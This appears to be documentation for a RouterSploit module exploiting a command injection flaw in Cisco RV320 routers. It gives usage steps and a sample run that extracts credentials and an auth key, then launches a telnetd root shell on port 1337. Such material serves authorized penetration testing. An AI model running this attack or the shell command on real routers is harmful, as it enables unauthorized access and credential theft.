## Description

Module exploits Cisco RV320 Remote Command Injection vulnerability in the web-based certificate generator feature.

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use exploits/routers/cisco/rv320_command_injection`
  3. Do: `set target [TargetIP]`
  4. Do: `set command [Remote Command]`
  5. Do: `run`
  6. If router is vulnerable, it should be possible to execute command on operating system level.

## Scenarios

```
rsf > use exploits/routers/cisco/rv320_command_injection
rsf (Cisco RV320 Command Injection) > set target 192.168.1.1
[+] target => 192.168.1.1
rsf (Cisco RV320 Command Injection) > set command "telnetd -l /bin/sh -p 1337"
[+] command => "telnetd -l /bin/sh -p 1337"
rsf (Cisco RV320 Command Injection) > run
[*] Running module exploits/routers/cisco/rv320_command_injection...
[+] Target is vulnerable
[*] Gonna go grab us a config file...
[+] We seem to have found a valid config!
[*] Extracting Creds...
[+] Got user: cisco
[+] Got password (hash): [redacted]
[*] Sending request to extract auth key...
[+] Got auth_key value: 1964300002
[+] Login Successful, we can proceed!
[*] Ok, now to run your command: telnetd -l /bin/sh -p 1337
[*] We don't get output so... Yeah. Shits blind.
